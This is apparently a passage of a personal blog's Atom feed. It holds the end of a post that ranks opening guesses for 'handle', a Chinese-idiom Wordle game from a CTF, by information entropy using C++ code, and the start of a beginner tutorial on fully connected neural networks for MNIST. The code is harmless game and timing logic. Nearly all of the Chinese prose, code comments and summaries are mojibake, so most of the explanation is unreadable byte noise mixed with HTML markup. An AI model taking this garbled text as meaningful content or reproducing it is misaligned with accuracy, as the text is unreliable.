class="comment">// E calculation with depth=0 for all data</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; enabled; <span class="comment">// å½¢å¼ enabledï¼Œé™¤äº†å‚æ•°å ä½æ— å®é™…ä½œç”¨</span></span><br><span class="line">    <span class="built_in">list</span>&lt;EntropyRecord&gt; entropyRecords, topERecs;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> guessIndex = <span class="number">0</span>; guessIndex &lt; MAXSIZE; guessIndex++)</span><br><span class="line">    &#123;</span><br><span class="line">        EntropyRecord myEntRec = GetEntropy(<span class="number">0</span>, guessIndex, enabled);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; D0-No.&quot;</span> &lt;&lt; guessIndex &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; words[guessIndex]</span><br><span class="line">             &lt;&lt; <span class="string">&quot; complete with E of &quot;</span> &lt;&lt; myEntRec.E &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        entropyRecords.push_back(myEntRec);</span><br><span class="line">    &#125;</span><br><span class="line">    entropyRecords.sort(cmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Save TOP ranks at depth 0 with E value</span></span><br><span class="line">    <span class="built_in">list</span>&lt;EntropyRecord&gt;::iterator iterERec = entropyRecords.begin();</span><br><span class="line">    ofstream f_word(&quot;d0rankedWord.txt&quot;), f_E(&quot;d0rankedE.txt&quot;);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> cnt = <span class="number">0</span>; iterERec != entropyRecords.end(); iterERec++, cnt++)</span><br><span class="line">    &#123;</span><br><span class="line">        f_word &lt;&lt; words[(*iterERec).index] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        f_E &lt;&lt; (*iterERec).E &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    f_word.close();</span><br><span class="line">    f_E.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// E calculation with depth=1 for TOP</span></span><br><span class="line">    iterERec = entropyRecords.begin();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> cnt = <span class="number">0</span>; cnt &lt; TOP; iterERec++, cnt++)</span><br><span class="line">    &#123;</span><br><span class="line">        EntropyRecord myEntRec = GetEntropy(<span class="number">1</span>, (*iterERec).index, enabled);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; D1-No.&quot;</span> &lt;&lt; cnt &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; words[(*iterERec).index]</span><br><span class="line">             &lt;&lt; <span class="string">&quot; complete with E of &quot;</span> &lt;&lt; myEntRec.E &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        topERecs.push_back(myEntRec);</span><br><span class="line">    &#125;</span><br><span class="line">    topERecs.sort(cmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Save TOP ranks at depth 1 with E value</span></span><br><span class="line">    f_word.open(<span class="string">&quot;d1rankedWord.txt&quot;</span>);</span><br><span class="line">    f_E.open(<span class="string">&quot;d1rankedE.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (iterERec = topERecs.begin(); iterERec != topERecs.end(); iterERec++)</span><br><span class="line">    &#123;</span><br><span class="line">        f_word &lt;&lt; words[(*iterERec).index] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        f_E &lt;&lt; (*iterERec).E &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    f_word.close();</span><br><span class="line">    f_E.close();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p>å…¶å®æˆ‘æ˜¯å‡†å¤‡å§handleå®Œæ•´æ¬åˆ°c++ä¸Šæ¥çš„ï¼Œç»“æœä»£ç å¼„å®Œäº†å‘ç°æˆ‘ä¸çŸ¥é“æ€ä¹ˆè®©c++æ”¯æŒä¸­æ–‡è¾“å…¥ï¼ˆï¼Ÿ</p><p>ä½†æ˜¯ä¸å‡†å¤‡ç»§ç»­æ—¥äº†ï¼Œæ”¾ä¸ªä¹‹å‰çš„ä»£ç </p><div class='spoiler collapsed'>    <div class='spoiler-title'>        crackGen.cpp    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetRand</span><span class="params">(<span class="keyword">int</span> seed=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    srand(seed ? seed : (<span class="keyword">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">return</span> rand() % MAXSIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowMatch</span><span class="params">(<span class="keyword">char</span> *partern, ZHword guess)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++, <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> index = j + <span class="number">3</span> * i;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">int</span>)partern[index] == <span class="number">2</span>)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[&quot;</span> &lt;&lt; guess.pinyin[index] &lt;&lt; <span class="string">&quot;]&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="keyword">int</span>)partern[index] == <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&lt;&quot;</span> &lt;&lt; guess.pinyin[index] &lt;&lt; <span class="string">&quot;&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; guess.pinyin[index];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">StartRound</span><span class="params">(<span class="keyword">int</span> roundLimit, <span class="built_in">list</span>&lt;ZHword&gt; words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">list</span>&lt;ZHword&gt;::iterator answer = words.begin();</span><br><span class="line">    advance(answer, GetRand() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> round = <span class="number">0</span>; round &lt; roundLimit; round++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">list</span>&lt;ZHword&gt;::iterator guess;</span><br><span class="line">        <span class="built_in">string</span> guessIn;</span><br><span class="line">        <span class="keyword">char</span> results[<span class="number">12</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Round: &quot;</span> &lt;&lt; round &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ====================================================== //</span></span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; guessIn; <span class="comment">// TNND C++ä¸èƒ½è¾“å…¥ä¸­æ–‡ QAQ</span></span><br><span class="line"><span class="comment">// ====================================================== //</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (guess = words.begin(); guess != words.end(); guess++)</span><br><span class="line">            <span class="keyword">if</span> ((*guess).word == guessIn)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ((*guess).word != guessIn)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Unkown word&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (CheckPart(*guess, *answer, results))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Correct&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ShowMatch(results, *guess);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Failed&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><p>è¿˜æœ‰å°±æ˜¯è¿™ä»¤äººå‘æŒ‡çš„è¿è¡Œé€Ÿåº¦ï¼Œä¸ä¼šå¤šæ ¸å¤šçº¿ç¨‹ä¼˜åŒ–æ‰€ä»¥æ²¡åŠæ³•ï¼Œä½†æ˜¯å¯ä»¥åŠ å…¥è®¡æ—¶å‡½æ•°é‡åŒ–æˆ‘çš„ç—›è‹¦ :)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">CheckTime</span><span class="params">(<span class="keyword">clock_t</span> &amp;start, <span class="keyword">clock_t</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> delta = <span class="keyword">double</span>(end - start) / CLOCKS_PER_SEC;</span><br><span class="line">    start = end;</span><br><span class="line">    <span class="keyword">return</span> delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">clock_t</span> clockStart;</span><br><span class="line">    clockStart = clock();</span><br><span class="line">    <span class="comment">// ... sth.</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;time length: &quot;</span> &lt;&lt; CheckTime(clockStart, clock()) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>windowsä¸‹g++ç¼–è¯‘ï¼Œ<code>depth=0</code>è·‘å®Œ<code>16</code>ä¸ªå¤§çº¦æ˜¯<code>12s</code>ï¼Œ<code>depth=1</code>è·‘å®Œ<code>4</code>ä¸ªå¤§çº¦æ˜¯<code>32s</code>ï¼Œæˆ‘å¤§æ¦‚æ˜¯èŠ±äº†4~5hè·‘å®Œæ‰€æœ‰æ•°æ®</p><p><del>ä»¥åŠåƒä¸‡ä¸è¦è®©æµ‹é€Ÿåº¦çš„è„šæœ¬èƒ½è¦†ç›–ç»“æœï¼Œåƒæˆ‘ç›´æ¥æŠŠä¹‹å‰ç®—å®Œçš„ç»™è¦†ç›–äº†ï¼Œå…¨éƒ¨é‡æ¥</del></p><h3 id="è¿è¡Œç»“æœ"><a href="#è¿è¡Œç»“æœ" class="headerlink" title="è¿è¡Œç»“æœ"></a>è¿è¡Œç»“æœ</h3><p>ç»è¿‡æ’åºå‘ç°</p><center><b>ç ”ç»é“¸å²</b></center><br><p>æ˜¯handleçš„æœ€ä¼˜å¼€å¤´ï¼Œä¸”åœ¨depth=1çš„æƒ…å†µä¸‹E=14.8701ï¼Œä»¥Î”E=0.03çš„å·¨å¤§å·®å€¼ï¼ˆç¬‘ï¼‰å’Œç¬¬äºŒåæ‹‰å¼€è·ç¦»</p><h2 id="ç»“æœç»Ÿè®¡"><a href="#ç»“æœç»Ÿè®¡" class="headerlink" title="ç»“æœç»Ÿè®¡"></a>ç»“æœç»Ÿè®¡</h2><p>åŸºæœ¬å…¨éƒ¨æ­£å¸¸çš„è¯åœ¨d0çš„Eéƒ½åœ¨10ä»¥ä¸Šï¼Œå°‘æ•°å¦‚â€œå¯å£å¯ä¹â€ï¼Œd0E=6.55192ï¼Œè¿™æ ·çš„è¯æ‹‰ä½äº†æ•´ä½“ä¸‹é™ï¼Œæ•´ä½“d0Eåˆ†å¸ƒå¦‚ä¸‹</p><img src="/images/handle_d0.png"/><p>å¯¹äºå‰d0Eæ’åtop100çš„è¯è¿›è¡Œd1Eçš„è®¡ç®—å’Œæ’åºï¼Œåˆ†å¸ƒå¦‚ä¸‹</p><img src="/images/handle_d1.png"/><p>æ—¥ä¸åŠ¨äº†ï¼Œå†è§ UwU</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;è™ç¬¦ç­¾åˆ°é¢˜handleï¼Œè¿å®˜æ–¹wpéƒ½å«ä½ ç›´æ¥éšä¾¿é€‰ä¸€ä¸ªçœ‹èµ·æ¥è¿‡å¾—å»çš„å°±è¡Œï¼Œç¡®å®æ˜¯handleé‡Œå¯¹äºå¼€å¤´çš„æˆè¯­åŸºæœ¬æ²¡å•¥è®²ç©¶ï¼Œä½†æ˜¯åæ­£åšéƒ½åšäº†ä¸å¦‚åšå®Œåšå¥½ï¼Œäºæ˜¯å°±åˆèŠ±äº†äº›æ—¶é—´è·Ÿç€3b1bçš„wordleè§†é¢‘åšäº†ä¸ªè¿™ï¼Œä¸»è¦æ˜¯&lt;b&gt;ä¿¡æ¯è®º&lt;/b&gt;çš„åº”ç”¨å’Œå¯¹C++çš„é¡ºä¾¿å®æ“&lt;/p&gt;</summary>
    
    
    
    <category term="Misc" scheme="https://kyriota.github.io/categories/Misc/"/>
    
    
    <category term="CTF" scheme="https://kyriota.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>å…¨è¿æ¥ç¥ç»ç½‘ç»œ[ç¥ç»ç½‘ç»œå…¥é—¨]</title>
    <link href="https://kyriota.github.io/2022/01/16/%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C[%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8]/"/>
    <id>https://kyriota.github.io/2022/01/16/%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C[%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8]/</id>
    <published>2022-01-16T04:40:00.000Z</published>
    <updated>2022-06-27T06:06:29.744Z</updated>
    
    <content type="html"><![CDATA[<p>å…¨è¿æ¥ç¥ç»ç½‘ç»œè¯†åˆ«MNISTæ‰‹å†™æ•°å­—é›†ï¼ŒAIä¸­çš„HelloWorld</p><img src="/images/FCNN_cover.png"/><span id="more"></span><!--toc--><h1 id="å…¨è¿æ¥ç¥ç»ç½‘ç»œ-ç¥ç»ç½‘ç»œå…¥é—¨"><a href="#å…¨è¿æ¥ç¥ç»ç½‘ç»œ-ç¥ç»ç½‘ç»œå…¥é—¨" class="headerlink" title="å…¨è¿æ¥ç¥ç»ç½‘ç»œ[ç¥ç»ç½‘ç»œå…¥é—¨]"></a>å…¨è¿æ¥ç¥ç»ç½‘ç»œ[ç¥ç»ç½‘ç»œå…¥é—¨]</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç°åœ¨çš„AIåº“è¯¸å¦‚<code>TensorFlow</code>,<code>Keras</code>,<code>Pytorch</code>ç­‰ï¼Œéƒ½å¯ä»¥å¿«æ·æ–¹ä¾¿åœ°åœ¨å‡ è¡Œä»£ç ä¹‹å†…å°±æ„å»ºå¥½ä¸€ä¸ªç½‘ç»œæ¨¡å‹ï¼Œç„¶åå¼€å§‹è®­ç»ƒç­‰åç»­çš„äº‹æƒ…ï¼Œä½†æŠŠè¿™äº›åº“å½“æˆé»‘ç›’æ¥ç”¨çš„è¯ï¼Œåæ­£æˆ‘æ˜¯æ™šä¸Šç¡ä¸ç€è§‰çš„</p><p>è™½ç„¶è¯´å…¨è¿æ¥ç¥ç»ç½‘ç»œï¼ˆFully Connected Neural Networkï¼Œä»¥ä¸‹ç®€ç§°<code>FCNN</code>ï¼‰æ˜¯äººé€ ç¥ç»ç½‘ç»œï¼ˆArtificial Neural Networkï¼Œä»¥ä¸‹ç®€ç§°<code>ANN</code>ï¼‰çš„å…¥é—¨ï¼Œä½†åœ¨è¿™ä¹‹å‰ä¹Ÿå¯ä»¥å…ˆåšä¸€äº›çº¿æ€§å›å½’ï¼Œé€»è¾‘å›å½’ï¼Œä»¥åŠé€»è¾‘å›å½’çš„å¤šåˆ†ç±»æ¥åŠ æ·±ç†è§£å’Œé™ä½å…¥é—¨çš„éš¾åº¦ï¼Œè¿™äº›ä¹Ÿæ˜¯æˆ‘ä¹‹å‰åšè¿‡çš„ä¸œè¥¿ï¼Œä½†å› ä¸ºå†™çš„æ¯”è¾ƒçƒ‚è€Œä¸”æœ¬èº«ä¹Ÿä¸éš¾ï¼Œå°±ä¸æ”¾å‡ºæ¥äº†</p><p>å› ä¸ºåœ¨è¿™ç¯‡æ–‡ç« ä¹‹å‰åªæœ‰<a href="https://kyriota.com/2021/11/25/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91GlobalNoise[AI%E5%AF%B9%E6%8A%97%E5%90%AF%E8%92%99]/">è¿™ç¯‡è®²å¯¹æŠ—æ‰°åŠ¨çš„æ–‡ç« </a>æ˜¯æœ‰å…³æœºå™¨å­¦ä¹ çš„ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿå°½é‡åœ¨è¿™ç¯‡æ–‡ç« ä¸­ç»†ğŸ”’ä¸€äº›æ¦‚å¿µå’Œç†è§£ï¼Œæœ€å¥½èƒ½è®©åƒç“œçš„ä¹Ÿèƒ½åƒçš„èˆ’æœ</p><h2 id="ANNæ¦‚è¿°"><a href="#ANNæ¦‚è¿°" class="headerlink" title="ANNæ¦‚è¿°"></a>ANNæ¦‚è¿°</h2><p>å¯¹äºç¥ç»ç½‘ç»œçš„è®¤è¯†å’Œç†è§£ï¼Œå¼ºçƒˆæ¨è<a href="https://www.bilibili.com/video/BV1bx411M7Zx">3b1bçš„ç³»åˆ—è§†é¢‘</a>ï¼ˆå…±å››é›†ï¼‰ï¼Œä»æ¦‚å¿µåˆ°å…¬å¼ä¸€æ¡é¾™æœåŠ¡ï¼Œè®²çš„è‚¯å®šæ¯”æˆ‘æ¸…æ¥šå’Œç›´è§‚</p><p>å¯¹äºç³»ç»Ÿå­¦ä¹ æœºå™¨å­¦ä¹ çš„ç›¸å…³çŸ¥è¯†ï¼ˆåŒ…æ‹¬çº¿æ€§å›å½’ï¼Œé€»è¾‘å›å½’ç­‰ï¼‰ï¼Œå¯ä»¥çœ‹<a href="https://www.bilibili.com/video/BV164411b7dx">å´æ©è¾¾ç³»åˆ—è§†é¢‘</a>ï¼ˆè¿™ä¸ªå°±æœ‰ç‚¹å¤šäº†ï¼‰</p><h3 id="ANNæ˜¯ä»€ä¹ˆ"><a href="#ANNæ˜¯ä»€ä¹ˆ" class="headerlink" title="ANNæ˜¯ä»€ä¹ˆ"></a>ANNæ˜¯ä»€ä¹ˆ</h3><p>ç¥ç»ç½‘ç»œä¸æ˜¯ç„å­¦ï¼Œå…¨æ˜¯æ•°å­¦ï¼Œå…·ä½“ç‚¹ï¼Œæˆ‘ç›®å‰åšçš„ä¸œè¥¿æ¶‰åŠåˆ°çš„æ¦‚å¿µå…¶å®ä¹Ÿå°±ï¼šåå¯¼æ•°ï¼Œçº¿æ€§ä»£æ•°ï¼Œé“¾å¼æ³•åˆ™ï¼Œéƒ½æ˜¯å¤§ä¸€å°±å­¦è¿‡çš„ä¸œè¥¿</p><p>æœ¬æ–‡ä¼šè®²è§£å¦‚ä½•è®­ç»ƒä¸€ä¸ªè¯†åˆ«MNISTæ‰‹å†™æ•°å­—é›†çš„ç¥ç»ç½‘ç»œï¼ŒMNISTæ‰‹å†™æ•°å­—é›†æ˜¯åŒ…å«äº†æ•°ä¸‡å¼ 28x28çš„æ‰‹å†™æ•°å­—å›¾åƒçš„æ•°æ®é›†ï¼ˆä»¥ä¸‹ç®€ç§°MNISTï¼Œä½†å…¶å®è¿˜æœ‰MNISTè¡£ç‰©å›¾ç‰‡çš„æ•°æ®é›†ç­‰ï¼‰ï¼Œæ¯ä¸ªæ•°å­—å¯¹åº”äº†ä¸€ä¸ª<code>lable</code>ï¼ŒæŒ‡æ˜å›¾åƒå¯¹åº”çš„æ•°å­—ï¼Œå¦‚ä¸‹å›¾å°±æ˜¯ä¸€ä»½æ•°æ®é›†ä¸­åŒ…å«çš„æ•°æ®æ ·æœ¬ï¼Œè€Œä»–å¯¹åº”çš„<code>lable</code>æ˜¯<code>1</code></p><img src="/images/FCNN_sample.png"/><p>æŠ½è±¡çš„è¯´ï¼Œç¥ç»ç½‘ç»œå°±æ˜¯ä¸€ä¸ªå‡½æ•°ï¼ˆè¿™æ ·æ€è€ƒå¯¹äºCTFä¸­æ„é€ å¯¹æŠ—æ ·æœ¬å¾ˆæœ‰å¸®åŠ©ï¼‰ï¼Œä½ ç»™ä»–ä¸€ä¸ªè¾“å…¥ï¼Œä»–ç»™ä½ ä¸€ä¸ªè¾“å‡º</p><p>è®°è¿™ä¸ªç½‘ç»œä¸º<code>h</code>ï¼ˆhypothesisï¼‰ï¼Œè¿™ä¸ªè¾“å…¥çš„<code>1</code>çš„æ•°å­—å›¾ç‰‡æ ·æœ¬è®°ä¸º<code>X</code>ï¼Œåˆ™æˆ‘ä»¬æ‰€æœŸå¾…çš„æ˜¯æ¨¡å‹è¾“å‡ºä¸€ä¸ªå‘é‡æ¥æè¿°å„ä¸ªæ•°å­—çš„æ¦‚ç‡<code>h(X)=&#123;0,1,0,0,0,0,0,0,0,0&#125;</code>ï¼ˆä»å·¦åˆ°å³æ˜¯0è‡³9çš„æ¦‚ç‡ï¼Œæ„æ€æ¨¡å‹è®¤ä¸ºå›¾ç‰‡æ˜¯<code>1</code>çš„æ¦‚ç‡æ˜¯100%ï¼Œæ˜¯é™¤äº†<code>1</code>ä»¥å¤–çš„æ•°å­—çš„æ¦‚ç‡æ˜¯0%ï¼Œè¿™æ ·çš„æ ¼å¼ç§°ä¸º<code>OneHot Encoding</code>ï¼Œå¥½å¤„æ˜¯ä¾¿äºçŸ©é˜µè®¡ç®—ï¼‰</p><h3 id="ANNä¸ºä½•è¡¨ç°å‡ºæ™ºèƒ½"><a href="#ANNä¸ºä½•è¡¨ç°å‡ºæ™ºèƒ½" class="headerlink" title="ANNä¸ºä½•è¡¨ç°å‡ºæ™ºèƒ½"></a>ANNä¸ºä½•è¡¨ç°å‡ºæ™ºèƒ½</h3><p>åœ¨3b1bçš„è§†é¢‘ä¸­ï¼Œä»–åœ¨Part1çš„5:40æåˆ°</p><blockquote><p>Why itâ€™s even reasonable to expect a layered structure like this to behave intelligently</p></blockquote><p>ä»–ç»™å‡ºäº†ä¸€ä¸ªæ¯”è¾ƒè®©äººå®¹æ˜“æ¥å—çš„ç†è§£ï¼Œå³åœ¨å¤šå±‚æ¬¡çš„ç»“æ„ä¸­ï¼Œä¸Šä¸€å±‚å¤„ç†å‡ºå›¾åƒçš„ä¸€äº›ç»†å¾®ç‰¹å¾ï¼Œç„¶ååœ¨ä¸‹ä¸€å±‚å¯¹è¿™äº›ç‰¹å¾è¿›è¡Œç»„åˆ</p><p>ä½†æ˜¾ç„¶çœŸæ­£çš„ç½‘ç»œå¹¶ä¸æ˜¯è¿™æ ·å·¥ä½œçš„ï¼Œåœ¨3b1bçš„è§†é¢‘ä¸­ï¼Œä»–åœ¨Part2çš„14:25å±•ç¤ºäº†ä¸€äº›ç¥ç»ç½‘ç»œçš„æƒé‡å¯è§†åŒ–ï¼Œè€Œç›´è§‚ä¸Šçœ‹å¯è§†åŒ–åçš„æƒé‡ï¼ŒåŸºæœ¬å°±æ˜¯ç¨å¾®æœ‰åºä¸€äº›çš„å™ªéŸ³ï¼Œæ‰€ä»¥å…³äºè¿™ä¸ªç½‘ç»œæ€ä¹ˆèƒ½å¤Ÿå¾—åˆ°æˆ‘ä»¬æ‰€æœŸå¾…çš„åŠŸèƒ½é‚£æ˜¯è¿™ä¸ªç½‘ç»œè‡ªå·±çš„äº‹æƒ…ï¼ˆâ€œä½ å·²ç»æ˜¯ä¸€ä¸ªæˆç†Ÿçš„ç¥ç»ç½‘ç»œäº†â€ï¼‰ï¼Œåªè¦ä»–æ‰¾åˆ°äº†ä¸€ä¸ªè¿˜ç®—ä¸é”™çš„å±€éƒ¨æœ€ä¼˜è§£ï¼Œé‚£å…¶å®å°±å·²ç»è¶³å¤Ÿäº†</p><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼ŒæŠŠANNçœ‹æˆä¸€ä¸ªæ•°å­¦æ¨¡å‹å°±è¡Œï¼Œåƒä¸‡åˆ«æƒ³ç„ä¹äº†ï¼Œåœ¨ç”Ÿç‰©ä¸Šçš„ç¥ç»ç§‘å­¦å‘å±•å®Œå…¨ä¹‹å‰ï¼Œå¯¹â€œæ™ºèƒ½â€çš„å®šä¹‰éƒ½ä¼šæ˜¯æ¯”è¾ƒæ¨¡ç³Šçš„ï¼Œæˆ‘ä»¬å°±ç®—æ„Ÿè§‰AIå¥½åƒæ‹¥æœ‰æ™ºèƒ½ï¼Œé‚£ä¹Ÿåªä¸è¿‡æ˜¯ä¸€ä¸ªç»“æ„æ¯”è¾ƒå¤æ‚çš„å‡½æ•°</p><h2 id="ä¸€ä¸ªç¥ç»å…ƒ"><a href="#ä¸€ä¸ªç¥ç»å…ƒ" class="headerlink" title="ä¸€ä¸ªç¥ç»å…ƒ"></a>ä¸€ä¸ªç¥ç»å…ƒ</h2><p>æˆ‘å¾ˆå–œæ¬¢çš„ä¸€å¥è¯ï¼šç®€å•çš„è§„åˆ™å¯ä»¥ç»„æˆå¤æ‚çš„ç³»ç»Ÿï¼Œè¿™å¥è¯åœ¨ç¥ç»ç½‘ç»œä¸­åŒæ ·é€‚ç”¨ï¼Œå…ˆç†è§£å•ä¸ªç¥ç»å…ƒçš„å·¥ä½œåŸç†ï¼Œæ‰èƒ½ç†è§£ä»–ä»¬ç»„æˆçš„ç½‘ç»œæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œåœ¨åç»­å¯¹ç¥ç»ç½‘ç»œçš„æ•°å­¦æ¨å¯¼ä¸­ï¼Œæˆ‘ä¹Ÿä¼šå…ˆå¯¹å•ä¸ªç¥ç»å…ƒç»„æˆçš„ç½‘ç»œæ¨å¯¼ï¼Œç„¶åå†æ¨å¹¿å¼€æ¥ï¼Œæ–¹ä¾¿æˆ‘è¿™æ ·ğŸ§ ä¸å¤ªå¥½çš„äººç†è§£ï¼ˆè¿™ä¹Ÿæ˜¯3b1bçš„åšæ³•ï¼Œå¤ªç…§é¡¾äººäº†</p><p>ä»¥ä¸‹å†…å®¹å‡ä»¥ä¸‹å›¾æ‰€ç¤ºç½‘ç»œä¸ºä¾‹</p><img src="/images/FCNN_cover.png"/><p>é¦–å…ˆæ˜ç¡®ï¼ŒFCNNæ˜¯ä¸€ä¸ªå¤šå±‚æ¬¡ç»“æ„ï¼ŒåŒ…å«äº†è¾“å…¥å±‚ï¼Œéšè—å±‚ï¼Œè¾“å‡ºå±‚</p><p>å•ä¸ªç¥ç»å…ƒçš„æœºç†å¾ˆç®€å•ï¼Œè§‚å¯Ÿéšè—å±‚<code>Dense 